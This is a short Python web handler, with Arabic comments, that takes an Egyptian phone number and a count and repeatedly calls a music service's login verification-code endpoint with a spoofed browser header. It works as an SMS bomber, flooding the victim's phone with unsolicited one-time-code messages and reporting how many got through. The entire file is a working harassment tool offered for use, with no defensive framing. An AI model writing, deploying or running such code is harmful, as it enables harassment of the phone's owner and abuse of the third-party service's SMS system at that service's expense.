from http.server import BaseHTTPRequestHandler
import json
import requests
import time
import random

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # قراءة البيانات المرسلة من الواجهة
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)

        number = data.get('number')
        sms_count = data.get('sms_count')

        # التحقق من البيانات
        if not (number and number.startswith("01") and len(number) == 11 and sms_count):
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"message": "بيانات غير صحيحة"}).encode())
            return

        # تنفيذ الكود الأصلي
        success_count, failure_count = self.send_sms_requests(number, sms_count)

        # إرسال رد للواجهة
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        response_message = f"تمت العملية: {success_count} رسالة ناجحة و {failure_count} فاشلة."
        self.wfile.write(json.dumps({"message": response_message}).encode())

    def send_sms_requests(self, number, sms_count):
        url = "https://api.twistmena.com/music/Dlogin/sendCode"
        phone_number = "2" + number
        success = 0
        failure = 0

        for _ in range(sms_count):
            payload = json.dumps({"dial": phone_number})
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Content-Type": "application/json",
            }
            try:
                response = requests.post(url, headers=headers, data=payload, timeout=5)
                if response.status_code == 200:
                    success += 1
                else:
                    failure += 1
            except Exception:
                failure += 1
            time.sleep(1) # تأخير بسيط بين الطلبات
            
        return success, failure
